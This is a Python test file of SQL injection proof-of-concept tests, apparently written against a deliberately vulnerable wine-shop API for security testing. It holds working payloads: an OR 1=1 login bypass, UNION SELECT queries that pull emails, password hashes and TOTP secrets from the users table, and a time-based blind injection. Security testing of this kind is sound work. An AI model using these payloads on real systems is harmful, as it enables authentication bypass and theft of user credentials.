"""
SQL Injection PoC Tests (Vulnerabilities #1-#5)

Each test exploits a real SQL injection vulnerability and asserts that
data was leaked or authentication was bypassed.
"""
import time

import requests


class TestSQLiLogin:
    """#1 - SQL Injection on POST /auth/login (email field)"""

    def test_vuln_01_sqli_login_bypass(self, base_url):
        """Auth bypass: ' OR 1=1 -- in email returns a valid token for the first user."""
        r = requests.post(f"{base_url}/auth/login", json={
            "email": "' OR 1=1 -- -",
            "password": "anything",
        })
        data = r.json()
        assert data["success"] is True, f"SQLi login bypass failed: {data}"
        assert "token" in data, "No token returned — injection did not bypass auth"


class TestSQLiWineId:
    """#2 - SQL Injection on GET /wines/:id (wine ID in URL)"""

    def test_vuln_02_sqli_wine_union(self, base_url):
        """UNION SELECT extracts user emails and password hashes from the users table."""
        payload = "0 UNION SELECT 1,email,password_hash,name,5,6,7,8,totp_secret,is_admin,11,12,13,14,15 FROM users--"
        r = requests.get(f"{base_url}/wines/{payload}")
        data = r.json()
        assert data["success"] is True, f"SQLi UNION on wine ID failed: {data}"
        wine = data["wine"]
        assert "@" in str(wine.get("name", "") or wine.get("region", "")), \
            "Expected leaked email in UNION result"


class TestSQLiWineSearch:
    """#3 - SQL Injection on GET /wines?search= (search query)"""

    def test_vuln_03_sqli_search_union(self, base_url):
        """UNION SELECT via search parameter leaks user data."""
        payload = "') UNION SELECT 1,email,password_hash,name,5,6,7,8 FROM users-- "
        r = requests.get(f"{base_url}/wines", params={"search": payload})
        data = r.json()
        assert data["success"] is True
        wines = data["wines"]
        emails = [w.get("name", "") for w in wines]
        assert any("@" in str(e) for e in emails), \
            f"Expected leaked emails in UNION results, got: {emails}"


class TestSQLiReviews:
    """#4 - SQL Injection on GET /wines/:id/reviews (wine ID)"""

    def test_vuln_04_sqli_reviews_union(self, base_url):
        """UNION SELECT on reviews endpoint leaks user data."""
        payload = "0 UNION SELECT 1,2,password_hash,4,email FROM users--"
        r = requests.get(f"{base_url}/wines/{payload}/reviews")
        data = r.json()
        assert data["success"] is True
        reviews = data["reviews"]
        found_email = any("@" in str(rev.get("user_name", "")) for rev in reviews)
        found_hash = any("$2y$" in str(rev.get("comment", "")) for rev in reviews)
        assert found_email or found_hash, \
            "Expected leaked user data in UNION results"


class TestBlindSQLiOrders:
    """#5 - Blind SQL Injection on GET /orders?status= (status filter)"""

    def test_vuln_05_blind_sqli_time_based(self, base_url, joe_token):
        """Time-based blind SQLi: RANDOMBLOB causes measurable delay."""
        headers = {"Authorization": f"Bearer {joe_token}"}

        start = time.time()
        requests.get(f"{base_url}/orders", headers=headers,
                     params={"status": "pending"})
        baseline = time.time() - start

        start = time.time()
        requests.get(f"{base_url}/orders", headers=headers, params={
            "status": "pending' AND 1=CASE WHEN (1=1) THEN RANDOMBLOB(200000000) ELSE 1 END--"
        })
        injected = time.time() - start

        assert injected > baseline + 0.5, \
            f"Expected significant delay from RANDOMBLOB. Baseline={baseline:.2f}s, Injected={injected:.2f}s"
